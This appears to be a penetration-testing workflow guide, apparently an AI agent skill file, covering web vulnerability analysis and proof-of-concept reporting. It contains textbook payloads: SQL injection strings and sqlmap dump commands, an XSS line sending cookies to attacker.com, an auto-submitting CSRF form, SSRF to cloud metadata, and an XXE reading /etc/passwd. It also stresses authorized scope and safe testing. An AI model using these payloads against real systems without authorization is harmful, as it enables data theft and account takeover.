# Exploitation Workflow

## Overview
Exploitation covers Phases 3-4 of the penetration testing methodology - vulnerability analysis and proof-of-concept development.

## Goals
- Identify security vulnerabilities
- Develop proof-of-concepts for confirmed vulnerabilities
- Chain vulnerabilities for higher impact
- Test privilege escalation and lateral movement
- Document exploitable issues for reporting

## Phase 3: Vulnerability Analysis

### SQL Injection Testing
```bash
# Manual testing
' OR '1'='1
admin'--
' UNION SELECT NULL--

# Using sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D database --tables
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump
```

### Cross-Site Scripting (XSS)
```javascript
// Reflected XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>

// Stored XSS
<script>fetch('https://attacker.com?c='+document.cookie)</script>

// DOM XSS
#<img src=x onerror=alert(1)>
```

### Authentication Bypass
- Default credentials testing
- Password reset vulnerabilities
- Session fixation
- JWT token manipulation
- OAuth misconfigurations

### Authorization Testing
- Horizontal privilege escalation (access other users' data)
- Vertical privilege escalation (access admin functions)
- IDOR (Insecure Direct Object References)
- Missing function-level access control

### CSRF (Cross-Site Request Forgery)
```html
<!-- CSRF PoC for state-changing action -->
<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

### File Upload Vulnerabilities
- Unrestricted file upload
- Path traversal in file names
- Executable file upload
- Image file with embedded code
- Zip slip vulnerability

### Server-Side Request Forgery (SSRF)
```bash
# Internal network access
http://target.com/fetch?url=http://127.0.0.1:8080/admin
http://target.com/fetch?url=http://192.168.1.1/

# Cloud metadata access
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

### XML External Entity (XXE)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Business Logic Flaws
- Race conditions
- Price manipulation
- Coupon/discount abuse
- Workflow bypass
- Mass assignment

## Phase 4: Exploitation & Proof-of-Concept

### Developing Proof-of-Concepts

**Requirements for PoC:**
- Clear reproduction steps
- Minimal complexity (simplest working example)
- Safe (non-destructive)
- Screenshots or video demonstration
- Impact explanation

**PoC Template:**
```markdown
# Vulnerability: [Type - e.g., SQL Injection]

## Severity: [Critical/High/Medium/Low]

## Affected Endpoint:
https://target.com/vulnerable-page

## Reproduction Steps:
1. Navigate to vulnerable endpoint
2. Input malicious payload: `payload here`
3. Observe response indicating vulnerability
4. Screenshot: [attached]

## Impact:
- Unauthorized database access
- Potential data exfiltration
- [Specific business impact]

## Remediation:
- Use parameterized queries
- Input validation and sanitization
- [Specific fix recommendations]
```

### Vulnerability Chaining

**Example Chain:**
1. SSRF to access internal admin panel (http://localhost/admin)
2. Admin panel has CSRF vulnerability
3. Use CSRF to create admin account
4. Use admin account for data exfiltration

**Impact Multiplication:**
- Low + Low → Medium/High through chaining
- Document the full attack path
- Explain business impact of the chain

### Privilege Escalation Testing

**Horizontal Escalation:**
- Access other users' data by manipulating IDs
- Session hijacking
- Account takeover via IDOR

**Vertical Escalation:**
- User → Admin escalation
- Missing authorization checks
- JWT role manipulation

### Lateral Movement Testing

**Within Application:**
- Access to different application modules
- Cross-tenant access in multi-tenant systems
- Accessing different environments (staging, admin, etc.)

**Within Infrastructure:**
- SSRF to internal services
- Pivot from web server to internal network
- Cloud metadata exploitation

### Data Exfiltration Testing

**Methods:**
- SQL injection → Database dump
- SSRF → Internal API access
- XXE → File system access
- File upload → Webshell → File system access

**PoC Approach:**
- Show ability to access data
- Don't actually exfiltrate sensitive data
- Screenshot showing first few characters
- Explain full potential impact

## Tools

### Vulnerability Scanning
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Web app scanner
- **sqlmap** - SQL injection automation
- **XSStrike** - XSS scanner
- **nuclei** - Template-based vulnerability scanner

### Exploitation Frameworks
- **Metasploit** - Exploitation framework
- **BeEF** - Browser exploitation
- **Commix** - Command injection exploitation

### Manual Testing Tools
- **curl** - HTTP requests
- **Burp Repeater** - Manual request manipulation
- **browser DevTools** - JavaScript debugging, network inspection

## Best Practices

1. **Permission first** - Never exploit beyond authorized scope
2. **Safe PoCs** - Non-destructive proof-of-concepts only
3. **Document thoroughly** - Screenshots, steps, payloads
4. **Verify findings** - Eliminate false positives
5. **Assess impact** - Explain business risk, not just technical issue
6. **Responsible testing** - Don't cause DoS, data corruption, or service disruption

## Common Pitfalls

- ❌ Skipping manual testing, relying only on scanners
- ❌ Not testing authentication and authorization thoroughly
- ❌ Missing business logic flaws
- ❌ Not attempting vulnerability chaining
- ❌ Poor PoC documentation

## Output Organization

```
exploitation/
├── sql-injection/
│   ├── vulnerable-endpoints.txt
│   ├── sqlmap-output.txt
│   └── poc-screenshots/
├── xss/
│   ├── reflected-xss.txt
│   ├── stored-xss.txt
│   └── poc.html
├── authentication/
│   ├── weak-passwords.txt
│   ├── bypass-methods.txt
│   └── screenshots/
└── reports/
    ├── vulnerability-summary.md
    └── poc-demos/
```

## Integration with Reporting (Phase 5)

### From Exploitation to Report:
1. Organize findings by severity
2. Create detailed PoC for each vulnerability
3. Assess and document business impact
4. Provide specific remediation recommendations
5. Include evidence (screenshots, logs, payloads)

## Reference

See full methodology: `~/.claude/skills/Webassessment/Workflows/pentest/Master-methodology.md`
